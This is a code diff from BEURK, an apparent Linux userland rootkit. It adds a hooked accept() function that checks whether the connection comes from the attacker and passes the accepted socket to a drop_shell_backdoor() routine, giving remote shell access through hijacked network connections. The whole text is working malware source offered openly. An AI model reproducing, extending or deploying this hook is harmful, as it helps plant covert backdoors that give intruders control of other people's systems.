@@ -18,19 +18,18 @@
  * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#pragma once
-
-#include <sys/types.h>
-#include <sys/stat.h>
 #include <sys/socket.h>
+#include "beurk.h"
+#include "drop_shell_backdoor.h"
 
-# define _HOOKED __attribute__((visibility("default")))
+int         accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) {
+    DEBUG(D_INFO, "call accept(2) hooked");
 
-/** Function hooks prototypes
- *
- * This header file contains ALL protypes of hooked functions.
- */
+    int     sock;
 
+    if (is_attacker())
+        return REAL_ACCEPT(sockfd, addr, addrlen);
 
-int open(const char *path, int oflag, mode_t mode) _HOOKED;
-int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) _HOOKED;
+    sock = REAL_ACCEPT(sockfd, addr, addrlen);
+    return drop_shell_backdoor(sock, addr);
+}
